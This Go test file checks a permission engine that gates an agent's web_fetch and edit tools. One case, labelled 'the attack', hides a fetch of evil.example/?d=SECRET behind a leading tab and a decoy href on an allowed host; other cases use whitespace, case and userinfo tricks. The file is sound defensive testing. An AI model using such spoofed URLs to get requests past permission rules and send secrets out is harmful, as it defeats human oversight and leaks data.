package perm

import (
	"context"
	"encoding/json"
	"sync"
	"testing"
	"time"

	"github.com/anemos-labs/sleipnir/internal/weburl"
)

// fetchReq is a web_fetch request with the given JSON input, as the tool sends it.
func fetchReq(input string) Request {
	return Request{Agent: "a1", Tool: "web_fetch", Input: json.RawMessage(input), Summary: "fetch", Network: true}
}

// A rule about a host is judged against the URL the tool fetches: the "url" field,
// normalised as the tool normalises it, never another field of the input.
func TestWebRulesJudgeTheURLTheToolFetches(t *testing.T) {
	f := newFixture(t)
	allow := f.engine(t, Config{Allow: []string{"WebFetch(domain:docs.example)"}})
	deny := f.engine(t, Config{Deny: []string{"WebFetch(domain:evil.example)"}, Allow: []string{"WebFetch"}})
	urlRule := f.engine(t, Config{Allow: []string{"WebFetch(https://docs.example/*)"}})
	cases := []struct {
		name            string
		input           string
		allowed, denied bool // under the allow engine; under the deny engine
		urlAllowed      bool
		host            string
	}{
		{"the attack: url with a leading tab, href on the allowed host", `{"url":"\thttp://evil.example/?d=SECRET","href":"http://docs.example/"}`, false, true, false, "evil.example"},
		{"leading space", `{"url":" http://evil.example/","href":"http://docs.example/"}`, false, true, false, "evil.example"},
		{"leading newline", `{"url":"\nhttp://evil.example/","uri":"http://docs.example/"}`, false, true, false, "evil.example"},
		{"leading NUL: the tool refuses it", `{"url":"\u0000http://evil.example/","href":"http://docs.example/"}`, false, true, false, ""},
		{"leading unicode space", `{"url":"  http://evil.example/","endpoint":"http://docs.example/"}`, false, true, false, "evil.example"},
		{"two keys, the url on the allowed host", `{"url":"https://docs.example/a","href":"http://evil.example/"}`, true, false, true, "docs.example"},
		{"uppercase scheme and host", `{"url":"HTTP://EVIL.EXAMPLE/x","href":"http://docs.example/"}`, false, true, false, "evil.example"},
		{"userinfo: the tool refuses it", `{"url":"http://docs.example@evil.example/"}`, false, true, false, ""},
		{"trailing dot is the same host", `{"url":"https://docs.example./page"}`, true, false, true, "docs.example"},
		{"no scheme means https", `{"url":"docs.example/page"}`, true, false, true, "docs.example"},
		{"no url at all", `{"href":"http://docs.example/"}`, false, true, false, ""},
		{"a subdomain of the allowed host", `{"url":"https://api.docs.example/x"}`, true, false, false, "api.docs.example"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			r := fetchReq(c.input)
			if got := allow.Check(context.Background(), r).Allow; got != c.allowed {
				t.Errorf("allow rule: allowed=%v, want %v", got, c.allowed)
			}
			d := deny.Check(context.Background(), r)
			if gotDenied := !d.Allow; gotDenied != c.denied {
				t.Errorf("deny rule: denied=%v (%q), want %v", gotDenied, d.Reason, c.denied)
			}
			if got := urlRule.Check(context.Background(), r).Allow; got != c.urlAllowed {
				t.Errorf("url rule: allowed=%v, want %v", got, c.urlAllowed)
			}
			if got := urlHost(r); got != c.host {
				t.Errorf("host %q, want %q", got, c.host)
			}
		})
	}
	// "don't ask again" remembers the host the tool fetched
	var shown []Request
	e := f.engine(t, Config{Prompter: func(_ context.Context, r Request) Decision {
		shown = append(shown, r)
		return Decision{Allow: true, Remember: ScopeSession}
	}})
	e.Check(context.Background(), fetchReq(`{"url":" https://Evil.Example./x","href":"http://docs.example/"}`))
	if g := e.Granted(); len(g) != 1 || g[0] != "WebFetch(domain:evil.example)" {
		t.Fatalf("remembered %v", g)
	}
}

// Two questions about one path with different content are two questions: an answer
// about one content never settles another.
func TestQuestionsCoalesceOnlyByteIdenticalRequests(t *testing.T) {
	f := newFixture(t)
	release := make(chan struct{})
	var mu sync.Mutex
	asked := 0
	e := f.engine(t, Config{Prompter: func(ctx context.Context, r Request) Decision {
		mu.Lock()
		asked++
		mu.Unlock()
		select {
		case <-release:
		case <-ctx.Done():
		}
		return Decision{Allow: true}
	}})
	edit := func(content string) Request {
		in, _ := json.Marshal(map[string]any{"path": "main.go", "old_string": "a", "new_string": content})
		return Request{Agent: "a1", Tool: "edit", Input: in, Summary: "edit main.go", Paths: []string{f.root + "/main.go"}, Writes: true}
	}
	var wg sync.WaitGroup
	for _, content := range []string{"content A", "content B", "content A"} {
		wg.Add(1)
		go func(r Request) {
			defer wg.Done()
			e.Check(context.Background(), r)
		}(edit(content))
	}
	// the first question is open; give the others time to coalesce or queue
	deadline := time.Now().Add(2 * time.Second)
	for {
		mu.Lock()
		n := asked
		mu.Unlock()
		if n >= 1 || time.Now().After(deadline) {
			break
		}
		time.Sleep(5 * time.Millisecond)
	}
	time.Sleep(50 * time.Millisecond)
	close(release)
	wg.Wait()
	mu.Lock()
	defer mu.Unlock()
	// content A twice shares one answer; content B is asked on its own
	if asked != 2 {
		t.Fatalf("asked %d times, want 2 (A once for both, B once)", asked)
	}
	// the key differs by summary and tool as well
	a, b := edit("x"), edit("x")
	b.Summary = "edit main.go again"
	if promptKey(a) == promptKey(b) {
		t.Fatal("different summaries share a key")
	}
	b = edit("x")
	b.Tool = "write"
	if promptKey(a) == promptKey(b) {
		t.Fatal("different tools share a key")
	}
	if promptKey(edit("x")) != promptKey(edit("x")) {
		t.Fatal("identical requests must share a key")
	}
}

// The engine's host of a web_fetch request is the host the tool's own parser gives,
// for every spelling the shared parser's tests know.
func TestEngineHostIsTheToolsHost(t *testing.T) {
	for _, raw := range []string{
		" https://docs.example/", "\thttps://evil.example/", "HTTP://EVIL.EXAMPLE/X", "https://docs.example./page", "docs.example/page",
		"http://docs.example@evil.example/", "http://[::1]:8080/x", "https://xn--bcher-kva.example/", "\x00https://evil.example/", "ftp://x/",
	} {
		in, _ := json.Marshal(map[string]string{"url": raw, "href": "https://other.example/"})
		want := ""
		if u, err := weburl.Parse(raw); err == nil {
			want = weburl.Host(u)
		}
		if got := urlHost(fetchReq(string(in))); got != want {
			t.Errorf("%q: engine host %q, tool host %q", raw, got, want)
		}
	}
}
